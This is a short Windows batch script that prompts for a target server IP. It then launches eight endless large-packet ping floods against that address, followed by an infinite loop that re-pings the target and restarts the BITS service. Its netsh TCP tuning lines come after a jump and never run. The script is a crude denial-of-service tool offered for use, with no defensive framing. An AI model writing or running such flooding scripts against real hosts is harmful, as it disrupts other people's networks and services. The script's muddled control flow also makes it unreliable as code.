@echo off
Color e
echo --------------------------------
echo   Wich Server are you connected
echo --------------------------------
Set /P server=Server Ip?=
cls

:fdp
CLS
color 0C
start ping -t -l 1000 %server%
start ping -t -l 1000 %server%
start ping -t -l 1000 %server%
start ping -t -l 1000 %server%
start ping -t -l 1000 %server%
start ping -t -l 1000 %server%
start ping -t -l 1000 %server%
start ping -t -l 1000 %server%
:bitch
ping %server% -n 2

sc query BITS | find /I "STATE" | find "STOPPED"
goto :start

:start
sc start BITS
goto :bitch1
netsh int tcp set heuristics disabled
netsh int tcp set global rss=enabled
netsh int tcp set global chimney=enabled
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set global ecncapability=disabled
netsh int tcp set global timestamps=disabled
:bitch1
ping %server% -n 2

sc query BITS | find /I "STATE" | find "STOPPED"
goto :start1

:start1
sc start BITS
goto bitch